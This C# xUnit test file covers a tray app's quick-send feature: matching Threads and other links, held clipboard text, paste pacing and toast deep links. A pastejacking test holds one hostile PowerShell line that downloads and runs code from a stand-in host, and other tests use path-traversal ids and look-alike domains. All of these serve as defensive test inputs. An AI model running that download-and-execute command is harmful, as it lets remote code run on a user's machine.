using System.IO;
using System.Xml.Linq;
using LocalOpsBot.Core.Mobile;
using LocalOpsBot.Tray.Services.Mobile;
using Xunit;

namespace LocalOpsBot.Tray.Tests;

/// <summary>
/// Quick send from a phone's PC shortcut (DECISIONS M-78, docs/QUICK_SEND.md §6): what goes straight onto the clipboard,
/// what is held behind a toast, and that the toast's link reaches held text by id only.
/// </summary>
public class QuickClipRangeTests
{
    private static readonly QuickClipPrefs Threads = QuickClipPrefs.Default;

    [Theory]
    [InlineData("https://www.threads.com/@zuck/post/DeZtp-TkQHh?xmt=abc")]
    [InlineData("https://www.threads.net/@nasa/post/Decc755lYhC")]
    [InlineData("이거 봐 https://www.threads.com/share/FT-8R3j6Q/ 웃김")]
    [InlineData("threads.com/@zuck/post/DeZtp-TkQHh")]
    [InlineData("www.threads.net/@nasa/post/Decc755lYhC")]
    [InlineData("(https://threads.com/@a/post/b).")]
    [InlineData("HTTPS://WWW.THREADS.COM/@A/POST/B")]
    [InlineData("https://m.threads.com/@a/post/b")]
    public void Threads_links_are_in_the_default_range(string text)
    {
        Assert.True(QuickClipRange.InRange(text, Threads));
        Assert.True(QuickClipRange.HasThreadsLink(text));
    }

    [Theory]
    [InlineData("https://example.com/threads.com/@a/post/b")]
    [InlineData("https://notthreads.com/@a/post/b")]
    [InlineData("https://threads.com.evil.example/@a")]
    [InlineData("threads.com")]
    [InlineData("see threads.com sometime")]
    [InlineData("회의실 B, 3시")]
    [InlineData("ftp://threads.com/@a/post/b")]
    public void Other_text_is_outside_the_default_range(string text)
    {
        Assert.False(QuickClipRange.InRange(text, Threads));
    }

    [Fact]
    public void Links_range_takes_any_http_link_and_all_takes_anything()
    {
        var links = new QuickClipPrefs(QuickScope.Links, []);
        Assert.True(QuickClipRange.InRange("look https://example.com/x", links));
        Assert.True(QuickClipRange.InRange("http://192.168.0.10:8080/a", links));
        Assert.False(QuickClipRange.InRange("example.com/x", links));
        Assert.False(QuickClipRange.InRange("plain words", links));

        var all = new QuickClipPrefs(QuickScope.All, []);
        Assert.True(QuickClipRange.InRange("plain words", all));
        Assert.True(QuickClipRange.InRange(new string('x', 50_000), all));
    }

    [Fact]
    public void Text_longer_than_the_archiver_reads_is_never_a_link()
    {
        var text = "https://www.threads.com/@a/post/b " + new string('x', QuickClipRange.MaxMatchBytes);
        Assert.False(QuickClipRange.InRange(text, Threads));
        Assert.False(QuickClipRange.InRange(text, new QuickClipPrefs(QuickScope.Links, [])));
        Assert.False(QuickClipRange.HasThreadsLink(text));
    }

    [Fact]
    public void The_length_bound_counts_utf8_bytes_like_the_archiver()
    {
        // 1,400 Korean characters are 4,200 bytes of UTF-8: under 4,096 characters, over the Archiver's 4,096 bytes.
        var korean = "https://www.threads.com/@a/post/b " + new string('가', 1400);
        Assert.True(korean.Length < QuickClipRange.MaxMatchBytes);
        Assert.False(QuickClipRange.InRange(korean, Threads));
        Assert.False(QuickClipRange.HasThreadsLink(korean));

        var fits = "https://www.threads.com/@a/post/b " + new string('가', 1300); // 34 + 3,900 bytes
        Assert.Equal("https://www.threads.com/@a/post/b", QuickClipRange.Pick(fits, Threads));
    }

    [Fact]
    public void Link_ranges_put_only_the_link_on_the_clipboard_never_the_text_around_it()
    {
        // Pastejacking: a command wrapped around an allowed link must not reach the clipboard.
        const string wrapped = "powershell -c \"iwr evil|iex\" https://threads.com/@a/post/b";
        Assert.Equal("https://threads.com/@a/post/b", QuickClipRange.Pick(wrapped, Threads));
        Assert.Equal("https://threads.com/@a/post/b", QuickClipRange.Pick(wrapped, new QuickClipPrefs(QuickScope.Links, [])));

        Assert.Equal("https://www.threads.com/share/FT-8R3j6Q/",
            QuickClipRange.Pick("이거 봐 (https://www.threads.com/share/FT-8R3j6Q/), 웃김", Threads));
        Assert.Equal("https://example.com/a?b=1", QuickClipRange.Pick("see \"https://example.com/a?b=1\". then https://threads.com/@a/post/b",
            new QuickClipPrefs(QuickScope.Links, [])));
        // The first link to a listed site, skipping other links before it.
        Assert.Equal("https://threads.net/@n/post/x",
            QuickClipRange.Pick("https://example.com/a https://threads.net/@n/post/x https://threads.com/@a/post/b", Threads));
    }

    [Fact]
    public void A_bare_site_link_goes_on_the_clipboard_with_https_in_front()
    {
        Assert.Equal("https://threads.com/@zuck/post/DeZtp-TkQHh", QuickClipRange.Pick("threads.com/@zuck/post/DeZtp-TkQHh", Threads));
        Assert.Equal("https://www.threads.net/@n/post/x", QuickClipRange.Pick("글 www.threads.net/@n/post/x.", Threads));
    }

    [Fact]
    public void The_all_range_puts_the_whole_text()
    {
        const string text = "메모\nhttps://threads.com/@a/post/b 그리고 더";
        Assert.Equal(text, QuickClipRange.Pick(text, new QuickClipPrefs(QuickScope.All, [])));
        Assert.Null(QuickClipRange.Pick("plain words", Threads));
    }

    [Fact]
    public void Typed_sites_become_plain_domains()
    {
        var sites = QuickClipRange.NormalizeSites("https://www.YouTube.com/watch?v=1\nthreads.com, threads.com\n\n x \n-bad-.com\nm.example.org:8443/path\n");
        Assert.Equal(new[] { "youtube.com", "threads.com", "m.example.org" }, sites);
        Assert.Empty(QuickClipRange.NormalizeSites("   "));
    }

    [Fact]
    public void A_listed_site_covers_its_subdomains_only()
    {
        var prefs = new QuickClipPrefs(QuickScope.Sites, ["youtube.com"]);
        Assert.True(QuickClipRange.InRange("https://m.youtube.com/watch?v=1", prefs));
        Assert.True(QuickClipRange.InRange("https://youtube.com/watch?v=1", prefs));
        Assert.False(QuickClipRange.InRange("https://notyoutube.com/watch?v=1", prefs));
        Assert.False(QuickClipRange.InRange("https://www.threads.com/@a/post/b", prefs));
        Assert.False(QuickClipRange.CoversThreads(prefs));
        Assert.True(QuickClipRange.CoversThreads(Threads));
        Assert.True(QuickClipRange.CoversThreads(new QuickClipPrefs(QuickScope.Links, [])));
    }
}

public class QuickClipSettingsTests : IDisposable
{
    private readonly string _dir = Path.Combine(Path.GetTempPath(), "hb-quick-" + Guid.NewGuid().ToString("N"));
    private readonly string _saved = QuickClipSettings.PathName;

    public QuickClipSettingsTests()
    {
        Directory.CreateDirectory(_dir);
        QuickClipSettings.PathName = Path.Combine(_dir, "quick-clip.json");
    }

    public void Dispose()
    {
        QuickClipSettings.PathName = _saved;
        try { Directory.Delete(_dir, recursive: true); } catch (IOException) { }
    }

    [Fact]
    public void An_empty_or_invalid_site_list_means_the_default_one()
    {
        File.WriteAllText(QuickClipSettings.PathName, "{\"scope\":\"sites\",\"sites\":[]}");
        Assert.Equal(new[] { "threads.com", "threads.net" }, QuickClipSettings.Load().Sites);
        File.WriteAllText(QuickClipSettings.PathName, "{\"scope\":\"sites\",\"sites\":[\"not a domain\",\"-x-\"]}");
        Assert.Equal(new[] { "threads.com", "threads.net" }, QuickClipSettings.Load().Sites);
        File.WriteAllText(QuickClipSettings.PathName, "{\"scope\":\"sites\"}");
        Assert.Equal(QuickClipPrefs.DefaultSites, QuickClipSettings.Load().Sites);
    }

    [Fact]
    public void No_file_means_threads_only()
    {
        Assert.Equal(QuickScope.Sites, QuickClipSettings.Load().Scope);
        Assert.Equal(new[] { "threads.com", "threads.net" }, QuickClipSettings.Load().Sites);
    }

    [Fact]
    public void The_range_round_trips_and_a_broken_file_means_the_default()
    {
        QuickClipSettings.Save(new QuickClipPrefs(QuickScope.Links, ["youtube.com"]));
        var loaded = QuickClipSettings.Load();
        Assert.Equal(QuickScope.Links, loaded.Scope);
        Assert.Equal(new[] { "youtube.com" }, loaded.Sites);

        File.WriteAllText(QuickClipSettings.PathName, "{ not json");
        Assert.Equal(QuickScope.Sites, QuickClipSettings.Load().Scope);
    }
}

public class HeldClipsTests : IDisposable
{
    private static readonly DateTimeOffset Now = new(2026, 11, 27, 12, 0, 0, TimeSpan.Zero);
    private readonly string _dir = Path.Combine(Path.GetTempPath(), "hb-held-" + Guid.NewGuid().ToString("N"));
    private readonly string _saved = HeldClips.PathName;

    private readonly string _savedMutex = HeldClips.MutexName;
    private readonly TimeSpan _savedWait = HeldClips.LockWait;

    public HeldClipsTests()
    {
        HeldClips.PathName = Path.Combine(_dir, "held-clips.dat");
        HeldClips.MutexName = @"Local\Homebase.HeldClips.Test." + Guid.NewGuid().ToString("N");
    }

    public void Dispose()
    {
        HeldClips.PathName = _saved;
        HeldClips.MutexName = _savedMutex;
        HeldClips.LockWait = _savedWait;
        try { Directory.Delete(_dir, recursive: true); } catch (IOException) { }
    }

    [Fact]
    public void A_store_that_cannot_be_written_says_so()
    {
        Directory.CreateDirectory(_dir);
        var blocker = Path.Combine(_dir, "not-a-folder");
        File.WriteAllText(blocker, "x");
        HeldClips.PathName = Path.Combine(blocker, "held-clips.dat");

        Assert.False(HeldClips.Add(ClipProtocol.NewId(), "x", "Galaxy", Now));
    }

    [Fact]
    public void A_store_locked_by_someone_else_is_not_touched()
    {
        var id = ClipProtocol.NewId();
        Assert.True(HeldClips.Add(id, "kept", "Galaxy", Now));
        HeldClips.LockWait = TimeSpan.FromMilliseconds(100);
        using var held = new ManualResetEventSlim();
        using var release = new ManualResetEventSlim();
        var owner = new Thread(() =>
        {
            using var mutex = new Mutex(false, HeldClips.MutexName);
            mutex.WaitOne();
            held.Set();
            release.Wait();
            mutex.ReleaseMutex();
        });
        owner.Start();
        held.Wait();
        try
        {
            Assert.False(HeldClips.Add(ClipProtocol.NewId(), "x", "Galaxy", Now));
            Assert.Null(HeldClips.Take(id, Now));
        }
        finally
        {
            release.Set();
            owner.Join();
        }
        // Untouched while locked: still there afterwards.
        Assert.Equal("kept", HeldClips.Take(id, Now)?.Text);
    }

    [Fact]
    public void Held_text_is_taken_once_by_its_id()
    {
        var id = ClipProtocol.NewId();

        Assert.True(HeldClips.Add(id, "메모 한 줄", "Galaxy S24", Now));
        Assert.Equal("메모 한 줄", HeldClips.Take(id, Now.AddMinutes(5))?.Text);
        Assert.Null(HeldClips.Take(id, Now.AddMinutes(6)));
    }

    [Fact]
    public void An_entry_put_back_after_a_busy_clipboard_keeps_its_sender_and_time()
    {
        var id = ClipProtocol.NewId();
        HeldClips.Add(id, "링크", "Galaxy S24", Now);
        var taken = HeldClips.Take(id, Now.AddHours(1))!;

        Assert.True(HeldClips.Put(taken, Now.AddHours(2)));
        var again = HeldClips.Take(id, Now.AddHours(3));
        Assert.Equal(new HeldClips.Entry(id, "링크", "Galaxy S24", Now), again);
        // Still within its own 24 hours, not 24 hours from being put back.
        HeldClips.Put(again!, Now.AddHours(3));
        Assert.Null(HeldClips.Take(id, Now + HeldClips.Lifetime));
    }

    [Fact]
    public void The_file_is_not_readable_as_plain_text()
    {
        HeldClips.Add(ClipProtocol.NewId(), "hunter2-plain", "Galaxy", Now);
        Assert.DoesNotContain("hunter2-plain", File.ReadAllText(HeldClips.PathName));
    }

    [Fact]
    public void Expired_unknown_or_malformed_ids_give_nothing()
    {
        var id = ClipProtocol.NewId();
        HeldClips.Add(id, "old", "Galaxy", Now);

        Assert.Null(HeldClips.Take(ClipProtocol.NewId(), Now));
        Assert.Null(HeldClips.Take("../../etc", Now));
        Assert.Null(HeldClips.Take(id, Now + HeldClips.Lifetime));
    }

    [Fact]
    public void Only_the_newest_twenty_are_kept()
    {
        var list = new List<HeldClips.Entry>();
        for (var i = 0; i < 25; i++) list = HeldClips.Added(list, new HeldClips.Entry($"id{i}", $"t{i}", "Galaxy", Now.AddSeconds(i)), Now.AddSeconds(i));

        Assert.Equal(HeldClips.Max, list.Count);
        Assert.Equal("id24", list[0].Id);
        Assert.DoesNotContain(list, e => e.Id == "id4");
    }
}

public class QuickClipDecisionTests
{
    private static readonly DateTimeOffset Received = new(2026, 11, 27, 12, 0, 0, TimeSpan.Zero);

    [Fact]
    public void Text_older_than_the_deadline_is_too_late_to_paste()
    {
        Assert.False(QuickClipDecision.TooLate(Received, Received + TimeSpan.FromSeconds(7)));
        Assert.True(QuickClipDecision.TooLate(Received, Received + TimeSpan.FromSeconds(7.1)));
        // Well inside the Agent's 10 s wait for the answer.
        Assert.True(QuickClipDecision.Deadline < TimeSpan.FromSeconds(10));
    }

    [Fact]
    public void A_paste_answers_with_the_archiver_and_warns_only_when_it_is_stopped()
    {
        Assert.Equal((new TrayClipOutcome(true, false, ClipArchiver.Stopped), true), QuickClipDecision.Pasted(true, ClipArchiver.Stopped));
        Assert.Equal((new TrayClipOutcome(true, false, ClipArchiver.Running), false), QuickClipDecision.Pasted(true, ClipArchiver.Running));
        Assert.Equal((new TrayClipOutcome(true, false, null), false), QuickClipDecision.Pasted(true, null));
        Assert.Equal((TrayClipOutcome.NotPasted, false), QuickClipDecision.Pasted(false, ClipArchiver.Stopped));
    }

    [Fact]
    public void Held_text_the_store_could_not_keep_is_refused_so_the_phone_sends_it_again()
    {
        Assert.Equal((new TrayClipOutcome(true, true, null), HeldNotice.CopyButton), QuickClipDecision.Held(sensitive: false, stored: true, null));
        Assert.Equal((TrayClipOutcome.NotPasted, HeldNotice.NotKeptFailed), QuickClipDecision.Held(sensitive: false, stored: false, null));
        Assert.Equal((new TrayClipOutcome(true, true, ClipArchiver.Running), HeldNotice.NotKeptSensitive),
            QuickClipDecision.Held(sensitive: true, stored: false, ClipArchiver.Running));
    }
}

public class QuickPacerTests
{
    [Fact]
    public async Task Text_that_waited_past_the_deadline_in_the_queue_is_not_pasted()
    {
        var now = new DateTimeOffset(2026, 11, 27, 12, 0, 0, TimeSpan.Zero);
        var pacer = new QuickPacer(() => now, d => { now += d; return Task.CompletedTask; });
        var received = now;
        var pasted = 0;

        now += TimeSpan.FromSeconds(8); // e.g. queued behind other pastes
        var (ok, late) = await pacer.RunBeforeAsync(received, () => { pasted++; return Task.FromResult(true); });

        Assert.Equal((false, true, 0), (ok, late, pasted));
        var fresh = await pacer.RunBeforeAsync(now, () => { pasted++; return Task.FromResult(true); });
        Assert.Equal((true, false, 1), (fresh.Ok, fresh.Late, pasted));
    }

    [Fact]
    public async Task The_gap_itself_can_push_text_past_the_deadline()
    {
        var now = new DateTimeOffset(2026, 11, 27, 12, 0, 0, TimeSpan.Zero);
        var pacer = new QuickPacer(() => now, d => { now += d; return Task.CompletedTask; });
        Assert.True(await pacer.RunAsync(() => Task.FromResult(true)));
        var received = now - TimeSpan.FromSeconds(6.5); // half a second left; the gap is a second

        var (ok, late) = await pacer.RunBeforeAsync(received, () => Task.FromResult(true));
        Assert.Equal((false, true), (ok, late));
    }
    [Fact]
    public async Task Pastes_wait_out_a_second_after_the_last_one_and_failures_start_no_gap()
    {
        var now = new DateTimeOffset(2026, 11, 27, 12, 0, 0, TimeSpan.Zero);
        var waits = new List<TimeSpan>();
        var pacer = new QuickPacer(() => now, d => { waits.Add(d); now += d; return Task.CompletedTask; });

        Assert.True(await pacer.RunAsync(() => Task.FromResult(true)));
        now += TimeSpan.FromMilliseconds(300);
        Assert.True(await pacer.RunAsync(() => Task.FromResult(true)));
        Assert.Equal(new[] { TimeSpan.FromMilliseconds(700) }, waits);

        now += TimeSpan.FromSeconds(5);
        Assert.False(await pacer.RunAsync(() => Task.FromResult(false)));
        Assert.True(await pacer.RunAsync(() => Task.FromResult(true)));
        Assert.Single(waits); // a second had passed; the failure set no new gap
    }

    [Fact]
    public async Task Pastes_run_one_at_a_time()
    {
        var pacer = new QuickPacer(delay: _ => Task.CompletedTask);
        var running = 0;
        var most = 0;
        async Task<bool> Put()
        {
            most = Math.Max(most, Interlocked.Increment(ref running));
            await Task.Delay(20);
            Interlocked.Decrement(ref running);
            return true;
        }

        await Task.WhenAll(Enumerable.Range(0, 5).Select(_ => pacer.RunAsync(Put)));
        Assert.Equal(1, most);
    }
}

public class HeldToastTests
{
    [Fact]
    public void The_held_toast_copies_by_id_only()
    {
        var id = ClipProtocol.NewId();
        var toast = XElement.Parse(ReceivedToast.HeldXml("Galaxy S24 <휴대폰>", "a & b", id));

        var link = $"homebase://clip/copy?id={id}";
        Assert.Equal(link, toast.Attribute("launch")!.Value);
        Assert.Equal(new[] { "Galaxy S24 <휴대폰>", "a & b" }, toast.Descendants("text").Select(t => t.Value));
        Assert.Equal(link, toast.Descendants("action").Single().Attribute("arguments")!.Value);
        Assert.Equal(id, ReceivedToast.ParseClip(link));
    }

    [Fact]
    public void Without_held_text_the_toast_has_no_link()
    {
        var toast = XElement.Parse(ReceivedToast.HeldXml("t", "b", null));
        Assert.Null(toast.Attribute("launch"));
        Assert.Empty(toast.Descendants("action"));
    }

    [Theory]
    [InlineData("homebase://clip/copy?id=../../x")]
    [InlineData("homebase://clip/copy?text=hello")]
    [InlineData("homebase://clip/paste?id=0123456789abcdef0123456789abcdef")]
    [InlineData("homebase://files/copy?id=0123456789abcdef0123456789abcdef")]
    [InlineData("https://clip/copy?id=0123456789abcdef0123456789abcdef")]
    [InlineData("homebase://clip/copy?id=0123456789abcdef0123456789abcdef&id=fedcba9876543210fedcba9876543210")]
    [InlineData("not a link")]
    public void Other_links_reach_no_held_text(string link)
    {
        Assert.Null(ReceivedToast.ParseClip(link));
    }
}
